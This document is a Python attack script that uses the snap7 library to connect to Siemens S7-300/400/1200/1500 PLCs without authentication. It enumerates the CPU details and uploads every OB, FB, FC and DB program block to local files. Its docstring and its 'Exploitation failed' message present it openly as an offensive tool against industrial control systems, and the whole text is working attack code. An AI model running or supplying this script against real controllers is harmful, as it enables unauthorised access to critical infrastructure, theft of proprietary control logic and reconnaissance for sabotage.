#!/usr/bin/env python3
"""
Extract PLC logic from Siemens S7-300/400/1200/1500
No authentication required on legacy PLCs
"""

import snap7
import os

def upload_plc_program(target_ip, output_dir="plc_extracted"):
    """
    Upload all program blocks from S7 PLC
    """
    os.makedirs(output_dir, exist_ok=True)

    plc = snap7.client.Client()

    try:
        plc.connect(target_ip, 0, 1)  # Rack 0, Slot 1
        print(f"[+] Connected to {target_ip}")

        # Get CPU info
        cpu_info = plc.get_cpu_info()
        print(f"[*] PLC: {cpu_info.ModuleTypeName}")
        print(f"[*] Serial: {cpu_info.SerialNumber}")
        print(f"[*] Firmware: {cpu_info.ASName}")

        # Get block list
        block_list = plc.list_blocks()
        print(f"\n[*] Blocks found:")
        print(f"    OB: {block_list.OBCount}")
        print(f"    FB: {block_list.FBCount}")
        print(f"    FC: {block_list.FCCount}")
        print(f"    DB: {block_list.DBCount}")

        # Upload all block types
        block_types = {
            'OB': range(1, block_list.OBCount + 1),
            'FB': range(1, block_list.FBCount + 1),
            'FC': range(1, block_list.FCCount + 1),
            'DB': range(1, block_list.DBCount + 1)
        }

        for block_type, block_range in block_types.items():
            for block_num in block_range:
                try:
                    print(f"[*] Uploading {block_type}{block_num}...")
                    block_data = plc.upload(block_type, block_num)

                    filename = f"{output_dir}/{block_type}{block_num}.mc7"
                    with open(filename, 'wb') as f:
                        f.write(block_data)

                    print(f"[+] Saved {filename} ({len(block_data)} bytes)")

                except Exception as e:
                    print(f"[-] Failed to upload {block_type}{block_num}: {e}")

        plc.disconnect()
        print(f"\n[+] Program extraction complete. Files saved to {output_dir}/")

    except Exception as e:
        print(f"[-] Exploitation failed: {e}")

# Usage
# upload_plc_program('192.168.1.100')
